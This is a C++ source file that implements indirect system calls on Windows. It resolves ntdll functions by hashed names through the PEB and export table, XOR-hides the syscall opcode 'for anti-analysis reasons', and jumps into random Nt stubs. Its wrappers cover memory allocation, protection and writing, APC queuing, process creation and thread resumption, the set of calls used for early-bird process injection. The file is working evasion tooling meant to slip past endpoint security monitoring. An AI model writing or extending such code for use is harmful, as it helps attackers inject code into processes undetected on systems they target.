#include "Tasking-Indirect-Syscalls.hpp"


// Globals
static std::map<std::uint32_t, void*> g_Hashes;
static std::vector<void*> g_OrderedZw;
static std::vector<void*> g_UnorderedNt;
static bool g_InitComplete = false;

static volatile unsigned char g_SyscallOpcodeFirst = 0x16;				//16 ^ 25 = 0x0F
static volatile unsigned char g_SyscallOpcodeSecond = 0x1C;				//1C ^ 25 = 0x05




namespace IndirectSyscalls{

CREATEHASHW(ntdll);
CREATEHASHA(AllocateVirtualMemory);
CREATEHASHA(ProtectVirtualMemory);
CREATEHASHA(WriteVirtualMemory);
CREATEHASHA(QueueApcThread);
CREATEHASHA(CreateUserProcess);
CREATEHASHA(ResumeThread);


template<typename ...Args>
bool ResolveHashes(Args... hashes) {

	std::uint32_t arr[] = {hashes...};

	for (std::uint32_t& i : arr) {
		g_Hashes[i];
	}


	//
	// Get NTDLL 
	//

	PPEB pPeb = (PPEB)__readgsqword(0x60);
	
	PLDR_DATA_TABLE_ENTRY pDataEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pPeb->Ldr->InMemoryOrderModuleList.Flink);
	PLIST_ENTRY pListHead = reinterpret_cast<PLIST_ENTRY>(&(pPeb->Ldr->InMemoryOrderModuleList));
	PLIST_ENTRY pItr = reinterpret_cast<PLIST_ENTRY>(pListHead->Flink);
	byte* NtdllBase = nullptr;


	do {

		if (pDataEntry->FullDllName.Length) {

			if (JenkinsHash(NULL, pDataEntry->FullDllName.Buffer) == ntdll_compHashedW) {
				NtdllBase = static_cast<byte*>(pDataEntry->Reserved2[0]);
				break;
			}
		}

		pDataEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pItr->Flink);
		pItr = (PLIST_ENTRY)(pItr->Flink);


	} while (pItr != pListHead);

	
	if (NtdllBase == nullptr)
		return false;




	//
	// Get Export Directory And Populate Address arrays
	//

	PIMAGE_NT_HEADERS pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(NtdllBase + ((PIMAGE_DOS_HEADER)NtdllBase)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return false;


	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) \
		(NtdllBase + (pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));


	std::uint32_t* Names = reinterpret_cast<std::uint32_t*>(NtdllBase + pImgExportDir->AddressOfNames);
	std::uint32_t* Addresses = reinterpret_cast<std::uint32_t*>(NtdllBase + pImgExportDir->AddressOfFunctions);
	std::uint16_t* Ordinals = reinterpret_cast<std::uint16_t*>(NtdllBase + pImgExportDir->AddressOfNameOrdinals);


	for (size_t i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		char* Name = (char*)(NtdllBase + Names[i]);
		void* Address = (void*)(NtdllBase + Addresses[Ordinals[i]]);
		std::uint32_t NameHash = JenkinsHash(&Name[2], NULL);


		if (Name[0] == 'Z') {
			g_OrderedZw.emplace_back(Address);

			auto find = g_Hashes.find(NameHash);
			if (find != g_Hashes.end()) {
				
				find->second = Address;
			}
		}

		if (Name[0] == 'N' && Name[1] == 't' && g_UnorderedNt.size() < 30) {
			g_UnorderedNt.emplace_back(Address);
		}
	}


	//
	// Sort addresses by ascending order to determine SSN
	//

	std::sort(g_OrderedZw.begin(), g_OrderedZw.end());

	return (g_InitComplete = true);
}



byte* GetSyscallOpcode() {
	
	if (!g_InitComplete || g_UnorderedNt.size() < 29)
		return nullptr;

	std::srand(static_cast<std::uint32_t>(std::time(nullptr))); //seed


	std::uint32_t Index = static_cast<std::uint32_t>(std::rand() % g_UnorderedNt.size());
	byte* itr = static_cast<byte*>(g_UnorderedNt[Index]);

	while (*itr != 0xC3) {

		//For Anti-Analysis Reasons
		if ((g_SyscallOpcodeFirst ^ 25) == *itr && (g_SyscallOpcodeSecond ^ 25) == *(itr + 1))
			return itr;
		
		itr++;
	}

	return nullptr;
}




template <typename... Args>
NTSTATUS IndirectSyscall(std::uint32_t SyscallHash, Args... Arguments) {

	WORD SSN = 0;
	byte* SyscallOpcode = nullptr;
	NTSTATUS status = ERROR_SUCCESS;


	if (!g_InitComplete || g_UnorderedNt.size() < 29)
		return STATUS_HASHES_NOT_RESOLVED;


	auto Find = g_Hashes.find(SyscallHash);
	if (Find == g_Hashes.end())
		return STATUS_HASH_DOES_NOT_EXIST;


	for (WORD i = 0; i < g_OrderedZw.size(); i++) {

		if (g_OrderedZw[i] == Find->second) {
			std::cout << "\t-Calling SSN: 0x" << std::hex << i << " Via Indirect Syscalls..." << std::endl;
			
			SetSyscallValues(i, GetSyscallOpcode());
			status = SyscallGeneric(Arguments...);
			return status;
		}
	}

	return STATUS_IDS_FUNCTION_NOT_FOUND;
}



bool Initialize() {
	if (!g_InitComplete) {

		ResolveHashes(
			AllocateVirtualMemory_compHashedA,
			ProtectVirtualMemory_compHashedA,
			WriteVirtualMemory_compHashedA,
			QueueApcThread_compHashedA,
			CreateUserProcess_compHashedA,
			ResumeThread_compHashedA
		);
	}


	return g_InitComplete;
}




	/* Wrappers */

NTSTATUS NtAllocateVirtualMemory(
	HANDLE ProcessHandle, 
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect) {


	return IndirectSyscall(AllocateVirtualMemory_compHashedA,
		ProcessHandle,
		BaseAddress,
		ZeroBits,
		RegionSize,
		AllocationType,
		Protect
	);
}



NTSTATUS NtProtectVirtualMemory(
		HANDLE ProcessHandle,
		PVOID* BaseAddress,
		PSIZE_T RegionSize,
		ULONG NewProtect,
		PULONG OldProtect) {

	
	return IndirectSyscall(ProtectVirtualMemory_compHashedA,
		ProcessHandle,
		BaseAddress,
		RegionSize,
		NewProtect,
		OldProtect
	);
}



NTSTATUS NtWriteVirtualMemory(
		HANDLE ProcessHandle,
		PVOID BaseAddress,
		PVOID Buffer,
		SIZE_T BufferSize,
		PSIZE_T NumberOfBytesWritten) {


	return IndirectSyscall(WriteVirtualMemory_compHashedA,
		ProcessHandle,
		BaseAddress,
		Buffer,
		BufferSize,
		NumberOfBytesWritten
	);
}



NTSTATUS NtQueueApcThread(
		HANDLE ThreadHandle,
		void* ApcRoutine,
		PVOID ApcArgument1,
		PVOID ApcArgument2,
		PVOID ApcArgument3 ) {


	return IndirectSyscall(QueueApcThread_compHashedA,
		ThreadHandle,
		ApcRoutine,
		ApcArgument1,
		ApcArgument2,
		ApcArgument3
	);
}



NTSTATUS NtCreateUserProcess(
		PHANDLE ProcessHandle,
		PHANDLE ThreadHandle,
		ACCESS_MASK ProcessDesiredAccess,
		ACCESS_MASK ThreadDesiredAccess,
		POBJECT_ATTRIBUTES ProcessObjectAttributes,
		POBJECT_ATTRIBUTES ThreadObjectAttributes,
		ULONG ProcessFlags, 
		ULONG ThreadFlags, 
		PVOID ProcessParameters, 
		PPS_CREATE_INFO CreateInfo,
		PPS_ATTRIBUTE_LIST AttributeList) {


	return IndirectSyscall(CreateUserProcess_compHashedA,
		ProcessHandle,
		ThreadHandle,
		ProcessDesiredAccess,
		ThreadDesiredAccess,
		ProcessObjectAttributes,
		ThreadObjectAttributes,
		ProcessFlags,
		ThreadFlags,
		ProcessParameters,
		CreateInfo,
		AttributeList);

}



NTSTATUS NtResumeThread(
		HANDLE ThreadHandle,
		PULONG PreviousSuspendCount //Optional.
	) {

	return IndirectSyscall(ResumeThread_compHashedA,
		ThreadHandle,
		PreviousSuspendCount);
}


}